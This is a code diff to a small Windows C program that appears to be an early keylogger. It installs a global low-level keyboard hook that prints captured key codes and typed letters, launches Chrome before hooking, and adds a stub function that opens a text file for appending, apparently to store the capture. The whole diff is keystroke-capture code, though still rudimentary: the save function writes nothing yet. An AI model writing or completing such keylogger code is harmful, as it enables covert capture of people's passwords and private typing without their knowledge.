@@ -3,17 +3,50 @@
 HINSTANCE hinst;
 static HHOOK handlekeyboard = NULL;
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
-	printf("i pressed a key!\n");
+	LPKBDLLHOOKSTRUCT kb;
+	
+	kb = (LPKBDLLHOOKSTRUCT)lparam;
+	printf("%u\n", kb->vkCode);
+	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
+{	
+	LPKBDLLHOOKSTRUCT kb;
+
+	kb = (LPKBDLLHOOKSTRUCT)lparam;
+	if (kb->vkCode >= 65 && kb->vkCode <= 90 && wparam == WM_KEYDOWN)
+		printf("%c\n", (char)kb->vkCode);
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
 }
 
 void	setwinhook()
 {
-	hinst = GetModuleHandle(NULL);
+	STARTUPINFO startup;
+	PROCESS_INFORMATION process;
+	
+	SecureZeroMemory(&startup, sizeof(startup));
+	SecureZeroMemory(&process, sizeof(process));
+	startup.cb = sizeof(startup);
+	if (CreateProcess(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &process) == 0)
+		return;
+	hinst = GetModuleHandle(L"chrome.exe");
 	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0)) == NULL)
 		return;
+	CloseHandle(process.hProcess);
+	CloseHandle(process.hThread);
+}
+
+void	save_data()
+{
+	FILE *file;
+
+	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
+		_wperror(L" Open file failed ");
+	if (fclose(file) != 0)
+		_wperror(L" Close file failed ");
 }
 
 int	main(void)
